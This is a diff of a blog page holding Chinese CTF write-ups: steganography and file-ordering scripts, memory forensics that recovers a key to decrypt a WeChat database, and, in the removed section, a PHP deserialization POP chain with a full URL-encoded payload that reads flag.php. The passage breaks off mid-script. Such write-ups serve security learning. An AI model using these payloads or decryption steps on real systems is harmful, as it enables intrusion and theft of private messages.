@@ -71,6 +71,150 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-129" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/08/21/page-129/" class="article-date">
+  <time class="dt-published" datetime="2022-08-21T10:23:13.000Z" itemprop="datePublished">2022-08-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/08/21/page-129/">ISCC复现</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="黑暗森林"><a href="#黑暗森林" class="headerlink" title="黑暗森林"></a>黑暗森林</h3><p>通常bmp文件word bfreserved1和2值为0</p>
+<h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/400.PNG?raw=true" alt="400.PNG"></h3><p>但是这题给的图值存在</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/401.PNG?raw=true" alt="401.PNG"></p>
+<p>所以应该是需要根据这个bfReserved1 的值 找到值为1的图读取内容放在第一位</p>
+<p>值为2的图读取内容放在第二位以此类推</p>
+<p>跑脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pyzbar.pyzbar <span class="keyword">as</span> pyzbar</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span>  Image</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> = os.listdir(<span class="string">&#x27;./universe&#x27;</span>)</span><br><span class="line">lists = [<span class="string">&#x27;&#x27;</span>]*<span class="number">100</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">dir</span>:</span><br><span class="line">    file = <span class="string">f&#x27;./universe/<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">    img = Image.<span class="built_in">open</span>(file)</span><br><span class="line">    texts = pyzbar.decode(img)</span><br><span class="line">    <span class="keyword">for</span> text <span class="keyword">in</span> texts:</span><br><span class="line">        place = <span class="built_in">open</span>(file,<span class="string">&#x27;rb&#x27;</span>).read()[<span class="number">6</span>]</span><br><span class="line">        lists[place-<span class="number">1</span>] = text[<span class="number">0</span>].decode()</span><br><span class="line">out = <span class="string">&#x27;&#x27;</span>.join(lists)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(base64.b64decode(out.encode()))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>生成文件</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/402.PNG?raw=true" alt="402.PNG"></p>
+<p>是个rar压缩包 文件有问题</p>
+<p>broadcast.png 是apng格式的文件用网站分离一下</p>
+<p>得到这样的</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/403.PNG?raw=true" alt="403.PNG"></p>
+<p>每张图都有数字应该是要把rar中对应字节的数据删除</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">table = [21,42,47,50,53,71,72,73,88,113,118,125,128,148,150,158,161,162,166,167,176,190,194,206,223,236,239,266,269,270,274,289,290,302,305,308,316,318,326,328,329,360,375,392,395,414,425,443,450,463,469,471,477,487,494,498,514,519,522,523,527,531,540,555,561,574,589,627,629,636,637,654,668,673,689,690,704,736,751,752,753,763,765,769,774,780,801,814,817,858,870,899,915,928,934,948,951,964,967,982]</span><br><span class="line"></span><br><span class="line">f1 = open(&#x27;flag.rar&#x27;,&#x27;rb&#x27;).read()</span><br><span class="line">f2 = open(&#x27;outflag.rar&#x27;,&#x27;wb+&#x27;)</span><br><span class="line"></span><br><span class="line">tmp = f1[:1000] #数字最多982直接读取前1000</span><br><span class="line">tmp = list(tmp)</span><br><span class="line">tmp_list = []</span><br><span class="line">for j in range(1000):</span><br><span class="line">    if(j not in table):#将索引不在表中的弄掉</span><br><span class="line">        tmp_list.append(tmp[j])</span><br><span class="line">f2.write(bytearray(tmp_list))</span><br><span class="line">f2.write(f1[1000:])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到压缩包密码提示</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/404.PNG?raw=true" alt="404.PNG"></p>
+<p>bing搜一下</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/405.PNG?raw=true" alt="405.PNG"></p>
+<h3 id="弱雪"><a href="#弱雪" class="headerlink" title="弱雪"></a>弱雪</h3><p>从题目雪应该是有snow隐写但每个文档都没有snow隐写的感觉</p>
+<p>看每个文件的时间不太对劲</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/406.PNG?raw=true" alt="406.PNG"></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/407.PNG?raw=true" alt="407.PNG"></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/408.PNG?raw=true" alt="408.PNG"></p>
+<p>没有时间为40的文件</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/410.PNG?raw=true" alt="410.PNG"></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/411.PNG?raw=true" alt="411.PNG"></p>
+<p>写脚本大于40的作为0小于的作为1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">ss=&#x27;&#x27;</span><br><span class="line">path = &#x27;./Misc-2022.05.05/&#x27;</span><br><span class="line">n = 1936</span><br><span class="line">for i in range(n):</span><br><span class="line">    file = f&#x27;&#123;path&#125;&#123;i&#125;.txt&#x27;</span><br><span class="line">    #print(file)</span><br><span class="line">    time = os.path.getmtime(file)</span><br><span class="line">    #time = os.path.getmtime(f&#x27;./Misc-2022.05.05/&#123;i&#125;&#x27;)</span><br><span class="line">    if time &lt;1651438000:</span><br><span class="line">        ss +=&#x27;0&#x27;</span><br><span class="line">    else:</span><br><span class="line">        ss +=&#x27;1&#x27;</span><br><span class="line">print(ss)</span><br><span class="line">print(len(ss))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/412.PNG?raw=true" alt="412.PNG"></p>
+<p>解压缩得到</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/413.PNG?raw=true" alt="413.PNG"></p>
+<p>snow 隐写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"> </span><br><span class="line">with open(&quot;C:/Users/zazazazaz/Downloads/isccfuxian/1/password.txt&quot;, &#x27;r&#x27;) as f:</span><br><span class="line">    for passwd in f:</span><br><span class="line">        try:</span><br><span class="line">            with os.popen(f&#x27;C:/Users/zazazazaz/Downloads/isccfuxian/1/snow -C -p &quot;&#123;passwd.strip()&#125;&quot; &quot;C:/Users/zazazazaz/Downloads/isccfuxian/1/snow.txt&quot;&#x27;) as aaa:</span><br><span class="line">                rst = aaa.read()</span><br><span class="line">                if rst.find(&quot;ISCC&quot;) &gt;= 0 or rst.find(&quot;iscc&quot;) &gt;= 0 or rst.find(&quot;flag&quot;) &gt;= 0:</span><br><span class="line">                    print(rst)</span><br><span class="line">                    print(passwd)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/08/21/page-129/" data-id="cl736wg5g000138w773mh0izc" data-title="ISCC复现" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-128" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/08/21/page-128/" class="article-date">
+  <time class="dt-published" datetime="2022-08-21T10:23:10.000Z" itemprop="datePublished">2022-08-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/08/21/page-128/">巅峰极客easy_Forensic</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>压缩包 解压得到raw文件导入diskgenius</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/20221.PNG?raw=true" alt="20221.PNG"></p>
+<p>奈何没有专业版只导出hint.txt和secret.zip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hint:</span><br><span class="line">is _</span><br><span class="line">not </span><br></pre></td></tr></table></figure>
+
+<p>压缩包要密码 用vol</p>
+<p>vol.py -f secret.raw filescan –profile=Win7SP1x64 filescan &gt;1.txt</p>
+<p>把桌面的文件都导出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x000000007d80a7d0     16      0 R--r-- \Device\HarddiskVolume1\Users\Admin\Desktop\gift.jpg</span><br><span class="line">0x000000007d84e350     14      0 R--rw- \Device\HarddiskVolume1\Users\Admin\Desktop\secret.zip</span><br><span class="line">0x000000007dae0420     10      0 R--rw- \Device\HarddiskVolume1\Users\Admin\Desktop\wechat.txt</span><br><span class="line">0x000000007de7c070     11      0 R--r-d \Device\HarddiskVolume1\Users\Admin\Desktop\MRCv120.exe</span><br><span class="line">0x000000007dfa9150      9      0 R--r-d \Device\HarddiskVolume1\Users\Admin\Desktop\MRCC206.tmp</span><br><span class="line">0x000000007f1e6ad0      1      1 -W-r-- \Device\HarddiskVolume1\Users\Admin\Desktop\111.raw</span><br><span class="line">0x0000000072e8bf20      2      0 -W-rw- \Device\HarddiskVolume1\Users\Admin\Desktop\EULAaccepted.dat</span><br></pre></td></tr></table></figure>
+
+<p>有用的就jpg txt zip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gift.jpg: vol.py -f secret.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007d80a7d0 --dump-dir=./  </span><br></pre></td></tr></table></figure>
+
+<p>打开图片</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/20223.PNG?raw=true" alt="20223.PNG"></p>
+<p>看着像有东西 改一下图片高度</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/20224.PNG?raw=true" alt="20224.PNG"></p>
+<p>根据hint的内容空格应该是要换成下划线</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password：Nothing_is_more_important_than_your_life!</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解压缩得：A gift for You:  wHeMscYvTluyRvjf5d7AEX5K4VlZeU2IiGpKLFzek1Q=</span><br></pre></td></tr></table></figure>
+
+<p>WeChat.txt应该是微信的数据库文件</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/x1hy9/WeChatUserDB">https://github.com/x1hy9/WeChatUserDB</a>  网上找的脚本直接用把txt改成db</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/20225.PNG?raw=true" alt="20225.PNG"></p>
+<p>压缩包内的内容就是key了 将文件放入WIN_WECHAT_DB文件夹中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main.py -d windows -k wHeMscYvTluyRvjf5d7AEX5K4VlZeU2IiGpKLFzek1Q=</span><br></pre></td></tr></table></figure>
+
+<p>DECRYPT_WIN_WECHAT_DB 找到解密后的文件用010打开直接搜flag</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/20226.PNG?raw=true" alt="20226.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/08/21/page-128/" data-id="cl736wg54000038w78vtgdzg0" data-title="巅峰极客easy_Forensic" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-127" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/10/20/page-127/" class="article-date">
@@ -818,219 +962,6 @@
 
 
   
-    <article id="post-page-116" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/09/19/page-116/" class="article-date">
-  <time class="dt-published" datetime="2021-09-19T12:24:43.000Z" itemprop="datePublished">2021-09-19</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/09/19/page-116/">第五空间WEBFTP pklovecloud</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><a target="_blank" rel="noopener" href="https://github.com/wifeat/WebFTP">https://github.com/wifeat/WebFTP</a></p>
-<h5 id="github上有源码-上头说到了初始账号和密码"><a href="#github上有源码-上头说到了初始账号和密码" class="headerlink" title="github上有源码 上头说到了初始账号和密码"></a>github上有源码 上头说到了初始账号和密码</h5><p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/a1.PNG?raw=true" alt="a1.PNG"></p>
-<p>登不进去<br>审一审源码</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/a3.PNG?raw=true" alt="a3.PNG"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">然后意外地Readme/mytz.php?act=phpinfo</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>phpinfo里头就有flag了</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/a2.png?raw=true" alt="a2.png"></p>
-<h3 id="pklovecloud"><a href="#pklovecloud" class="headerlink" title="pklovecloud"></a>pklovecloud</h3><p>源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pkshow</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Pk very safe^.^&quot;</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cinder</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;cinder = <span class="keyword">new</span> pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;cinder))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cinder-&gt;echo_name();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;     </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack = unserialize(<span class="keyword">$this</span>-&gt;docker);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack-&gt;neutron = <span class="variable">$heat</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;openstack-&gt;neutron === <span class="keyword">$this</span>-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="string">&quot;./<span class="subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents(<span class="variable">$file</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;keystone lost~&quot;</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>]))  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$logData</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$logData</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>class ace</strong> 这里会反序列化docker但是后面</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">他访问的属性是class acp里面的</span><br></pre></td></tr></table></figure>
-
-<p>说明我们的docker里面得放<strong>acp序列化</strong>的内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova) 判定条件里头说的</span><br></pre></td></tr></table></figure>
-
-<h6 id="那么构造链条"><a href="#那么构造链条" class="headerlink" title="那么构造链条"></a>那么构造链条</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class acp </span><br><span class="line">&#123;   </span><br><span class="line">    protected $cinder;  </span><br><span class="line">    public $neutron = &#x27;a&#x27;;</span><br><span class="line">    public $nova = &#x27;a&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new acp();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">得到：O:3:&quot;acp&quot;:3:&#123;s:9:&quot;*cinder&quot;;N;s:7:&quot;neutron&quot;;s:1:&quot;a&quot;;s:4:&quot;nova&quot;;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 会触发toString这样在析构方法里面把pkshow换成ace，从而换成ace的echo_name()方法</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;flag.php&#x27;</span>;     </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span> = <span class="string">&#x27;O:3:&quot;acp&quot;:3:&#123;s:9:&quot;*cinder&quot;;N;s:7:&quot;neutron&quot;;s:1:&quot;a&quot;;s:4:&quot;nova&quot;;s:1:&quot;a&quot;;&#125;&#x27;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cinder</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;cinder = <span class="keyword">new</span> ace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> acp();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">得到?pks=O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3Bs%3A68%3A%22O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BR%3A3%3B%7D%22%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BR%3A6%3B%7D</span><br></pre></td></tr></table></figure>
-
-
-
-<p>查看源码就能拿到flag</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/a4.png?raw=true" alt="a4.png"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/09/19/page-116/" data-id="ckuzhneyf000iv4w7cdt56u2u" data-title="第五空间WEBFTP pklovecloud" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-115" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/09/09/page-115/" class="article-date">
-  <time class="dt-published" datetime="2021-09-09T09:00:56.000Z" itemprop="datePublished">2021-09-09</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/09/09/page-115/">又是misc</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h5 id="RCTF2019-draw"><a href="#RCTF2019-draw" class="headerlink" title="[RCTF2019]draw"></a>[RCTF2019]draw</h5><p>文本文档什么 cs pu lt 90 fd 500 有点熟悉 是你小乌龟<br><a target="_blank" rel="noopener" href="https://www.calormen.com/jslogo/">https://www.calormen.com/jslogo/</a>  配合这个使用将文档内容粘贴进去</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/225.PNG?raw=true" alt="225.PNG"></p>
-<h5 id="蜘蛛侠呀"><a href="#蜘蛛侠呀" class="headerlink" title="蜘蛛侠呀"></a>蜘蛛侠呀</h5><p>什么玩意抓包文件哪有蜘蛛侠(・∀・(・∀・(・∀・*)<br>不对 所有icmp包后面都跟了一串数据 tshark提取</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r out.pcap -T fields -e data &gt; data.txt</span><br></pre></td></tr></table></figure>
-
-<p>一个十兆多的文档很划算9兆的文件生成10兆的文档 有重复</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/226.PNG?raw=true" alt="226.PNG"></p>
-<p> 搞脚本去重</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">with open(&#x27;data.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line">    res_list = []</span><br><span class="line">    lines = file.readlines()</span><br><span class="line">    print(&#x27;[+]去重之前一共&#123;0&#125;行&#x27;.format(len(lines)))</span><br><span class="line">    print(&#x27;[+]开始去重，请稍等.....&#x27;)</span><br><span class="line">    for i in lines:</span><br><span class="line">        if i not in res_list:</span><br><span class="line">            res_list.append(i)</span><br><span class="line">    print(&#x27;[+]去重后一共&#123;0&#125;行&#x27;.format(len(res_list)))</span><br><span class="line">    print(res_list)</span><br><span class="line"></span><br><span class="line">with open(&#x27;data1.txt&#x27;, 